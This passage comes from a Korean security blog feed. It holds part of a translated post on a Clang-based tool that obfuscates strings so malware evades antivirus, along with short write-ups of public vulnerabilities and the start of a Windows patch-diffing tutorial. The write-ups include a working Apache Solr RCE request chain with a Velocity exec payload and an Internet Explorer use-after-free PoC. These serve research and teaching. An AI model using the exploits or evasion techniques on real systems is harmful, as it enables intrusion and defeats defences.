Replacement);&#125;</code></pre><p>보통 텍스트 교체는 <code>ReplaceText</code> API를 쓰지만 많은 버그가 발생했다. 매크로의 경우 Clang의 API는 불규칙하게 동작하여 복잡하다. 예를 들어 <code>isMacroBodyExpansion()</code>을 통한 확인이 없으면 인자가 아니라 <code>&quot;TEXT&quot;</code>가 교체된다. <code>LoadLibrary(TEXT(&quot;ntdll&quot;))</code>에서<code>LoadLibrary(your_variable(&quot;ntdll&quot;))</code>로 잘못 교체되는 것이다.</p><p>이유는 <code>&quot;TEXT&quot;</code>가 <em>Clang</em>의 전처리기에 의해 처리될 때 <code>L&quot;ntdll&quot;</code>을 교체하는 매크로이기 때문이다. transformation pass는 전처리기 작업이 완료된 후 발생하므로 <code>&quot;ntdll&quot;</code>의 시작과 끝 위치를 쿼리 하는 것은 몇 글자가 빠진 잘못된 값이 나올 수 있어서 유용하지 않다. 불행하게도 기존 translation unit에 실제 위치를 쿼리하는 것은 Clang API를 이용하였고 시행착오를 거쳐서 해결 방법을 찾았다.</p><h3 id="인접한-빈-공간에-변수-선언-삽입"><a href="#인접한-빈-공간에-변수-선언-삽입" class="headerlink" title="인접한 빈 공간에 변수 선언 삽입"></a>인접한 빈 공간에 변수 선언 삽입</h3><p>이제 문자열 리터럴을 변수 identifier로 바꿀 수 있으니 변수를 정의하고 원래 문자열로 할당해야 한다. 패치된 소스 코드에 아무것도 덮어쓰지 않고 <code>char your_variable[] = &quot;ntdll&quot;</code>을 해야 한다.</p><p>두 가지 시나리오가 있다:</p><ul><li>문자열 리터럴이 함수 바디 안에 위치한다.</li><li>문자열 리터럴이 함수 바디 밖에 위치한다.</li></ul><p>후자는 문자열 리터럴이 사용되는 표현식의 시작 부분을 찾으면 돼서 가장 간단하다.</p><p>전자는 포함된 함수를 찾아야 한다. 그 후 Clang은 API로 함수 바디의 시작 위치를 쿼리 한다. 변수가 전체 함수에서 볼 수 있고 우리가 삽입한 토큰이 내용을 덮어 씌우지 않으므로 변수 선언을 삽입할 공간으로 이상적이다.</p><p>어떤 경우든 두 가지 상황은 <code>FunctionDecl</code> 혹은 <code>VarDecl</code> 타입의 노드가 발견될 때까지 모든 부모 노드를 방문해서 해결한다.</p><pre><code class="hljs cpp">MatchHandler::findInjectionSpot(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,                                <span class="hljs-keyword">const</span> clang::StringLiteral &amp;Literal, <span class="hljs-keyword">bool</span> IsGlobal, <span class="hljs-keyword">uint64_t</span> Iterations) &#123;    <span class="hljs-keyword">if</span> (Iterations &gt; CLIMB_PARENTS_MAX_ITER)        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">std</span>::runtime_error(<span class="hljs-string">&quot;Reached max iterations when trying to find a function declaration&quot;</span>);    ASTContext::DynTypedNodeList parents = Context-&gt;getParents(Literal);;    <span class="hljs-keyword">if</span> (Iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = Context-&gt;getParents(Parent);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;FunctionDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">auto</span> FunDecl = parent.get&lt;clang::FunctionDecl&gt;();            <span class="hljs-keyword">auto</span> *Statement = FunDecl-&gt;getBody();            <span class="hljs-keyword">auto</span> *FirstChild = *Statement-&gt;child_begin();            <span class="hljs-keyword">return</span> &#123;FirstChild-&gt;getBeginLoc(), FunDecl-&gt;getEndLoc()&#125;;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;VarDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">if</span> (IsGlobal) &#123;                <span class="hljs-keyword">return</span> parent.get&lt;clang::VarDecl&gt;()-&gt;getSourceRange();            &#125;        &#125;        <span class="hljs-keyword">return</span> findInjectionSpot(Context, parent, Literal, IsGlobal, ++Iterations);    &#125;&#125;</code></pre><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/SCRT/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..bash run_example.sh test/string_simplest.c</code></pre><p><img src="/2020/11/22/idioth/av_evasion_part1/4.png"></p><p>보다시피 잘 동작한다. 지금 이 예제는 정규식으로 해결할 만큼 코드가 짧다. </p><h2 id="Going-further"><a href="#Going-further" class="headerlink" title="Going further"></a>Going further</h2><p>지금은 obfuscation pass의 이름이 <code>StringEncryptor</code>이지만 실제로 문자열이 암호화되지 않는다. 문자열을 암호화하려면 얼마나 많은 노력이 필요할까?</p><h3 id="To-be-continued…"><a href="#To-be-continued…" class="headerlink" title="To be continued…"></a>To be continued…</h3><p>문자열을 난독화하는 것은 쉬운 부분이지만 Clang API에 익숙해야 한다. 소스 코드 문서를 보는데 1~2주 정도 쓰는 것을 추천한다.</p><p>다음 파트에서는 자동으로 API import를 숨기는 것에 대해 다룰 것이다.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>bypass</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
      <tag>opfuscation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] German Corona-Warn-App sever RCE</title>
    <link href="/2020/11/21/fabu1ous/2020-11-21/"/>
    <url>/2020/11/21/fabu1ous/2020-11-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/securing-the-fight-against-covid19-through-oss">Securing the fight against COVID-19</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Corona-Warn-App(contect tracking infrastructure of Germany)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Corona-Warn-App(이하 CWA)은 독일의 접촉자 기록/추적 인프라입니다. 이 앱이 설치된 스마트폰은 블루투스로 식별 payload를 브로드케스트하고, 블루투스의 신호 범위 내에 들어온 다른 디바이스들이 이 payload와 payload를 받은 시각을 2주간 저장합니다. 양성 판정을 받은 사용자는 검사 결과와 이에 대한 키값(Diagnosis key)을 CWA server에 전송할 수 있습니다.</p><p>CWA 서버는 Spring boot 프레임워크로 동작하며 Diagnosis key를 받아 처리하는 과정에서 <a href="https://securitylab.github.com/research/bean-validation-RCE">Java Bean Validation</a> 취약점이 존재합니다. </p><p>Spring boot app이 입력받은 객체를 validate 한다는 것은 그 객체가 constraint 조건에 만족하는지 확인하는 동작을 뜻합니다. constraint 조건은 ‘@’를 통해 사용합니다.</p><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Input</span> </span>&#123;  <span class="hljs-meta">@Min(1)</span>  <span class="hljs-meta">@Max(10)</span>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> num;    <span class="hljs-comment">//...</span>&#125;</code></pre><p>int형 num의 최솟값이 1, 최댓값이 10인 constraint 조건이 걸려있는 코드입니다. <code>@Min()</code>이나 <code>@Max()</code>처럼 built-in 조건만 있는 것이 아니라 custom constraint 또한 존재하고, 이를 이용한 validation을 custom constraint validation이라 부릅니다.</p><pre><code class="hljs powershell">input : ab<span class="hljs-variable">$</span>&#123;<span class="hljs-number">12</span>*<span class="hljs-number">12</span>&#125;<span class="hljs-built_in">cd</span>output : ab144<span class="hljs-built_in">cd</span></code></pre><p>custom constraint validation 동작 중 함수<code>buildConstraintViolationWithTemplate()</code>는 메세지 템플릿을 에러 메세지로 변환시켜줍니다. 메세지 템플릿에 <code>$&#123;&#125;</code>를 통해 Expression Language를 삽입할 수 있으며 그 실행결과가 에러 메세지에 반영됩니다. 만약 이 메세지 템플릿의 내용을 해커가 접근할 수 있다면 RCE 취약점입니다.</p><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void add<span class="hljs-constructor">Violation(ConstraintValidatorContext <span class="hljs-params">validatorContext</span>, String <span class="hljs-params">message</span>)</span>&#123;    validatorContext.build<span class="hljs-constructor">ConstraintViolationWithTemplate(<span class="hljs-params">message</span>)</span>.add<span class="hljs-constructor">ConstraintViolation()</span>;&#125;</code></pre><p>CWA 서버는 <code>buildConstraintViolationWithTemplate()</code>을 호출하며 그 인자인 message는 사용자 입력값(Diagnosis key 속 데이터)이기 때문에 RCE 공격에 취약합니다. 사용자 입력을 sanitizing 하도록 패치되었지만, bypass가 가능하다는 평이 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>rce</tag>
      
      <tag>covid19</tag>
      
      <tag>ios</tag>
      
      <tag>germany</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</title>
    <link href="/2020/11/20/l0ch/2020-11-20/"/>
    <url>/2020/11/20/l0ch/2020-11-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957">CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Apache Solr 6.6.0-6.6.5<br>Apache Solr 7.0.0-7.7.3<br>Apache Solr 8.0.0-8.6.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Solr는 Apache Lucene을 기반으로 만들어진 검색 엔진입니다. 사용자는 특정 형식의 XML 파일을 서버에 업로드하여 인덱스를 생성하거나 검색 요청을 하여 결과를 XML 형식으로 얻을 수 있습니다.</p><p>이러한 Solr의 ConfigSet API 에 unauthrization config upload 가 가능해 RCE까지 이어질 수 있는 취약점이 발견되었습니다.</p><p>사용자는 ConfigSet API를 사용해 configset을 업로드하고 logical index를 구성하는 컬렉션을 생성할 수 있습니다. 이 때 원격 코드 실행에 악용될 수 있는 일부 기능들을 필터링해 악성 컬렉션이 구성되는 것을 방지합니다. 그러나 <code>configset.upload.enabled</code> 옵션이 true로 설정되어 있으면 이를 UPLOAD 와 CREATE 로 우회할 수 있습니다.</p><ol><li><p>먼저 악성 configset을 포함하는 압축 파일을 UPLOAD 합니다. </p> <pre><code class="hljs jsx">curl -X POST --header <span class="hljs-string">&quot;Content-Type:application/octet-stream&quot;</span>--data-binary@<span class="hljs-number">7.</span>zip <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=UPLOAD&amp;name=file1&quot;</span></code></pre></li><li><p>CREATE는 기존 configset을 기반으로 새로운 configset을 작성할 수 있습니다. 이를 이용해 UPLOAD된 configset을 기반으로 새로운 configset을 만들면 악용 가능한 기능들을 필터링을 하지 않아 인증 검사 로직을 우회할 수 있습니다.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=CREATE&amp;name=file3&amp;baseConfigSet=file1&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true&quot;</span></code></pre></li><li><p>2에서 얻은 새로운 configset를 기반으로 악성 컬렉션을 생성합니다.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/collections?action=CREATE&amp;numShards=1&amp;name=file2&amp;collection.configName=file3&quot;</span></code></pre></li><li><p>생성된 악성 컬렉션은 원격 코드 실행에 사용할 수 있습니다.</p> <pre><code class="hljs jsx">http:<span class="hljs-comment">//[host]/solr/newCollection3/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=&#x27;&#x27;)+%23set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span></code></pre></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.secpulse.com/archives/144081.html">https://www.secpulse.com/archives/144081.html</a></p><p><a href="https://issues.apache.org/jira/browse/SOLR-14925">https://issues.apache.org/jira/browse/SOLR-14925</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>apache solr</tag>
      
      <tag>unauthrization upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17053: Internet Explorer UAF 취약점</title>
    <link href="/2020/11/19/idioth/2020-11-19/"/>
    <url>/2020/11/19/idioth/2020-11-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Internet Explorer에서 neutering ArrayBuffer로 인한 use after free 취약점이 발견되었습니다. 해당 취약점은 CVE-2020-1380과 비슷한 취약점이지만 JIT 엔진 없이 트리거할 수 있습니다.</p><p>JIT 엔진을 사용하지 않고 item을 TypedArray로 변환할 때 <em>jscript.dll</em>은 interpreter에서 다음과 같은 작업을 수행합니다.</p><ol><li><code>Js::JavascriptConversion::ToNumber()</code> 호출</li><li>TypedArray의 ArrayBuffer가 detach 되었는지 확인</li><li>변환할 element의 index와 TypedArray의 길이 비교</li><li><code>Js::JavascriptConversion::ToNumber()</code>를 다시 호출하여 ArrayBuffer로 값 설정</li></ol><p><code>Js::JavascriptConversion::ToNumber()</code>의 첫 번째 호출에서 해커는 callback 함수를 통해 TypedArray의 ArrayBuffer를 free 할 수 있고 uaf를 발생시킬 수 있습니다. 이것을 막기 위해 첫 번째 호출 후 ArrayBuffer가 detach 되었는지 확인하여 user code callback에서 메모리가 free 되는 것을 방지합니다. 하지만 두 번째 호출에서는 별다른 검사를 하지 않기 때문에 이를 악용하여 uaf를 발생시킬 수 있습니다.</p><details><summary>POC Code</summary><p><pre><code class="hljs js"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float32Array</span>(<span class="hljs-number">0x100</span>);<span class="hljs-keyword">var</span> flag = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">index, value</span>) </span>&#123;    arr[index] = value;&#125;<span class="hljs-keyword">var</span> obj = &#123;&#125;;obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>) &#123;        worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;&quot;</span>);        worker.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;;        worker.postMessage(<span class="hljs-number">0</span>, [arr.buffer]);        worker.terminate();        worker = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;    &#125;    flag = <span class="hljs-number">1</span>;&#125;;pwn(<span class="hljs-number">0</span>, obj);</code></pre></p></details><p>두 번째 인자를 <code>obj</code>로 <code>pwn</code> 함수를 호출하면 item을 TypedArray로 변환할 때 <code>Js::JavascriptConversion::ToNumber()</code>가 호출되어 callback 함수가 두 번 호출됩니다. 첫 번째 호출에는 <code>flag == 0</code>이므로 ArrayBuffer가 neutering 되지 않지만 두 번째 호출에서 ArrayBuffer가 neutering 됩니다. 두 번째 호출에서는 ArrayBuffer가 detach 되었는지 검사하지 않으므로 uaf가 발생합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>use after free</tag>
      
      <tag>internet explorer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15647: website stealing files from device</title>
    <link href="/2020/11/18/fabu1ous/2020-11-18/"/>
    <url>/2020/11/18/fabu1ous/2020-11-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@kanytu/firefox-and-how-a-website-could-steal-all-of-your-cookies-581fe4648e8d">Firefox: How a website could steal all your cookies</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firefox Fennec v68.9.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox Fennec에서 Arbitrary local file access 취약점(CVE-2020–15647)이 발견되었습니다. 이를 악용한 해커의 웹 사이트에 접속하면 핸드폰의 파일을 탈취당할 수 있습니다.</p><p>안드로이드용 <code>Firefox Content Provider</code>의 misconfigure로 인해 발생하는 취약점으로 Firefox에서 접근할 수 있는 모든 파일을 웹페이지가 읽을 수 있고 해커의 웹 서버로 내용을 전송할 수 있습니다. 취약점이 발생하는 이유는 다음과 같습니다.</p><ol><li><code>content://</code> URI로 파일을 열면 파일명을 바꾸지 않고 cache 한 뒤 그곳으로 redirect 합니다.</li><li><a href="https://developer.android.com/training/secure-file-sharing/setup-sharing">file content provider</a>의 공유 가능 디렉터리가 root-path로 설정돼있습니다.</li></ol><p>브라우저는 로컬 html 파일을 열 때 <code>content://</code> URI를 사용합니다. victim device에서 탈취하고자 하는 파일(이하 target)과 동일한 이름의 악성 html 파일을 업로드하고 실행하면 Firefox가 파일명을 유지한 채로 cache 합니다. 악성 html 파일은 브라우저가 target을 <code>content://</code>로 열게 하고 기존에 cache 된 파일이 target의 내용으로 overwrite 됩니다. 악성 html이 이를 파싱해 해커의 웹 서버로 전송할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>firefox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Samsung Neural Processing Unit memory corruption in shared memory parsing</title>
    <link href="/2020/11/17/l0ch/2020-11-17/"/>
    <url>/2020/11/17/l0ch/2020-11-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2073">Samsung NPU (Neural Processing Unit) memory corruption in shared memory parsing</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Samsung’s Exynos-based devices (including Neural Processing Unit)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>삼성의 엑시노스 모바일 프로세서에 포함된 NPU(Neural Processing Unit)는 머신러닝 연산에 사용됩니다. 이러한 NPU의 Neural Network Feature Maps를 패키징하는데 사용되는 <code>NCP</code> 구조체의 입력 값 검증을 하지 않아 memory corruption이 발생하는 취약점이 발견되었습니다.</p><p>Convolution Neural Network Feature Maps(IFM / OFM)을 패키징하는 <code>npu_session_s_graph</code> 에서는 먼저<code>__get_session_info</code> 를 호출해 사용자 영역 ION 메모리 버퍼를 커널 메모리에 매핑합니다.</p><blockquote><p>ION - process 간 메모리 공유를 위한 메모리 할당자</p></blockquote><p>그리고 <code>__config_sesison_info</code>를 호출해 매핑된 메모리를 파싱하는데, 아래와 같은 과정에서 취약점을 트리거할 수 있습니다.</p><ol><li><code>__pilot_parsing_ncp</code> 에서 <code>temp_IFM_av</code> 버퍼의 크기는 사용자 영역 공유 메모리에서 가져온  <code>ncp-&gt; memory_vector_cnt</code> 을 사용해 먼저 계산됩니다.</li><li>TOCTOU 버그를 트리거해 사용자 영역에서 <code>ncp-&gt; memory_vector_cnt</code> 의 값을 더 큰 값으로 변경합니다.</li><li>이후 <code>__second_parsing_ncp</code> 에서 <code>ncp-&gt; memory_vector_cnt</code> 를 다시 읽어 <code>temp_IFM_av</code> 버퍼에 복사합니다.</li><li>2단계에서 큰 값으로 변경된 <code>ncp-&gt; memory_vector_cnt</code> 로 인해 <code>temp_IFM_av</code> 버퍼의 사이즈보다 더 많은 값을 복사하게 되고 이때 bounds check를 하지 않아 heap buffer overflow가 발생합니다.</li></ol><p>해당 취약점을 이용하면 커널 스레드 스택을 포함해 vmap의 커널 버퍼 범위를 벗어나 데이터를 쓸 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>toctou</tag>
      
      <tag>samsung</tag>
      
      <tag>L0ch</tag>
      
      <tag>npu</tag>
      
      <tag>neural processing unit</tag>
      
      <tag>heap buffer overflow</tag>
      
      <tag>exynos</tag>
      
      <tag>shared memory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Two Privilege Escalation Vulnerability in Ivanti Unified Endpoint Manager</title>
    <link href="/2020/11/16/idioth/2020-11-16/"/>
    <url>/2020/11/16/idioth/2020-11-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.jumpsec.com/detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/">Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Unified Endpoint Manager &lt;= 2020.1.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><strong>CVE-2020-13770: Named pipe token impersonation</strong></p><p>해당 취약점은 프로세스가 named pipe object를 열 때 보안 attribute가 부적절하여 발생한 취약점입니다. </p><p><code>CreateFile</code>의 <code>dwFlagsAndAttributes</code> 인자가 아래와 같은 attribute일 때 취약점이 발생합니다.</p><ul><li>SECURITY_DELEGATION</li><li>SECURITY_IMPERSONATION</li></ul><p>위의 두 attribute 중 하나로 named pipe를 열면 서버는 클라이언트 토큰을 얻고 추후 access check에 사용합니다. pipe 서버는 pipe 클라이언트의 권한, security context 등을 사용할 수 있으므로 서버보다 클라이언트의 권한이 높으면 서버는 권한 상승을 할 수 있습니다.</p><p><strong>CVE-2020-13771: DLL search order hijacking</strong></p><p>해당 취약점은 윈도우의 <a href="https://docs.microsoft.com/ko-kr/windows/win32/dlls/dynamic-link-library-search-order">DLL Search Order</a>를 이용한 취약점입니다. <code>SafeDllSearchMode</code> 설정에 관계없이 프로세스가 DLL 파일을 찾지 못하면 환경 변수 PATH에서 파일을 찾습니다. 해커가 환경 변수에 등록된 폴더에 조작된 DLL 파일을 배치하면 취약한 프로세스가 해당 DLL을 로드하고 그 프로세스의 context로 <code>DllMain</code>이 실행되어 권한상승을 할 수 있습니다. 해당 프로그램에서 악용할 수 있는 dll 파일은 아래와 같습니다.</p><ul><li>ldprofileui.dll</li><li>wfapi.dll</li><li>DMIAPI32.DLL</li><li>logonsrv.dll</li><li>OOBCredentials.dll</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>lpe</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>dll search order</tag>
      
      <tag>named pipe</tag>
      
      <tag>impersonation attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing 맛보기 Part 1</title>
    <link href="/2020/11/15/l0ch/windows-patch-diffing-part1/"/>
    <url>/2020/11/15/l0ch/windows-patch-diffing-part1/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요! L0ch입니다. 저번 <a href="https://hackyboiz.github.io/2020/11/01/l0ch/cve-2020-1464/">GlueBall 취약점</a> 글 썼을 때 디핑 할 버전별 바이너리를 구하다가 멘탈이 파쇄기에 갈린 종이마냥 갈릴 뻔했죠?</p><p>생각해보니까 괜히 Diffing 하겠다고 건드렸다가 X고생했는데 이대로 가만히 있으면 왠지 억울하자나여. 그래서 이 참에 좀 쉽게 쉽게 갈 수 있는 방법을 찾느라 방황하던 중 엄청난 글을 발견하게 되는데..</p><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p><p>이거 완전 나를 위한 글이잖아??ㅎ</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/1.png"></p><p>그래서! 바로 정리에 들어갔죠. 앞으로 할 삽질은 꿈에도 모른 채 ㅋㅋ 아</p><h1 id="Diffing-이-뭔데"><a href="#Diffing-이-뭔데" class="headerlink" title="Diffing 이 뭔데?"></a>Diffing 이 뭔데?</h1><p>간단하게 Binary Diffing이 뭔지 짚고 넘어가 봅시다!</p><blockquote><p>Diffing 은 일반적으로 컴퓨터에서 두 개 파일의 차이를 보여주는 용어다. (Ex : git diff - Git의 소스코드 difference 확인) 바이너리 분석 기법(Binary Diffing)으로도 쓰이는데, 패치 또는 업데이트된 바이너리와 기존 바이너리를 비교해서 어떤 코드가 변경되었는지, 어떤 함수가 추가되고 제거되었는지 등 버전 별 바이너리의 차이점을 알 수 있는 분석 기법이다.</p></blockquote><p>한마디로 얘네가 뭐를 어떻게 패치했나~ 바뀐 부분만 쓱 둘러보는 분석 기법입니다. 별 거 없어 보이지만 Diffing을 하면서 패치로 인해 발생한 새로운 취약점이나, 기존 취약점에 대해 적용한 패치를 우회하는 새로운 방법 등을 효율적으로 찾을 수 있습니다. 오늘은 앞서 말한 것처럼 Windows Update 패치를 추출하고 추출한 업데이트 파일을 이용해 Diffing을 진행해 볼게요.</p><h1 id="Windows-Update-Package"><a href="#Windows-Update-Package" class="headerlink" title="Windows Update Package"></a>Windows Update Package</h1><h2 id="Microsoft-Update-Catalog"><a href="#Microsoft-Update-Catalog" class="headerlink" title="Microsoft Update Catalog"></a>Microsoft Update Catalog</h2><p>윈도우는 업데이트 패키지를 배포해 실행하는 방식으로 패치를 합니다.</p><p>Windows 10 기준으로 버전 별로 나누어 배포하고 있으며 오늘은 다음 환경에서 진행합니다.</p><pre><code class="hljs markdown">Windows 10 ver1903, 64bit</code></pre><p>버전에 따라 받아야 하는 업데이트 파일이 다르니 참고하시면 됩니다!</p><p>기본적으로 윈도우는 자동 업데이트 방식을 사용하지만 윈도우 카탈로그에서 독립 실행형 패치 패키지를 받아 수동 설치할 수도 있습니다.</p><p>윈도우 카탈로그 : <a href="https://www.catalog.update.microsoft.com/Home.aspx">https://www.catalog.update.microsoft.com/Home.aspx</a></p><p>Windows 카탈로그는 다음과 같은 형식의 검색 기능을 제공합니다.</p><pre><code class="hljs lisp">YYYY-MM release-number (<span class="hljs-name">x86</span><span class="hljs-name">|x64|</span><span class="hljs-name">ARM64</span>) cumulative</code></pre><p>제 윈도우는 1903, 64bit 이므로 8월 업데이트를 찾기 위해 아래 키워드로 검색을 해볼게요.</p><pre><code class="hljs angelscript"><span class="hljs-number">2020</span><span class="hljs-number">-08</span> <span class="hljs-number">1903</span> x64 cumulative</code></pre><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/2.png"></p><p>검색을 하면 이렇게 업데이트 목록들이 주르륵 뜨는데, Diffing 하길 원하는 파일이 패치된 업데이트 항목을 받으면 됩니다. 전 <code>KB4565351</code> 을 받도록 할게요.</p><h1 id="Extract-Update-Package"><a href="#Extract-Update-Package" class="headerlink" title="Extract Update Package"></a>Extract Update Package</h1><p>업데이트 파일을 다운로드하면 <code>msu</code> 확장명의 업데이트 패키지를 받을 수 있습니다.</p><p>이 패키지에서 파일들을 추출해내면 됩니다.</p><h2 id="Extract-msi"><a href="#Extract-msi" class="headerlink" title="Extract msi"></a>Extract msi</h2><p>PowerShell에서 <code>expand.exe -F:* &quot;[msu file name]&quot; .\\ext\\</code> 명령어로 패치 컨텐츠들을 추출하면 아래 사진과 같이 ext 폴더 안에 추출된 파일들이 있는 걸 볼 수 있습니다~</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/3.png"></p><p>cab파일이 보이는군요, 이것도  역시 expand로 쓱싹 추출하도록 하죠!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/4.png"></p><p>..?? 왜 아무 반응이 없지..?</p><p>아 왜 안되나 했더니 좀 오래 걸리나 보군요 기다려 봅시다 ㅎ</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/5.png"></p><p>그렇게 <del>2000년 같은</del> 한 시간이 지나고.. 한 20분 정도 기다리다가 포기하고 저녁 먹고 오니까 끝나 있네요?</p><p>아니 뭐 추출 얼마나 한다고 이렇게 오래 걸리냐 하고 추출한 파일 개수를 세 봤는데</p><p><img 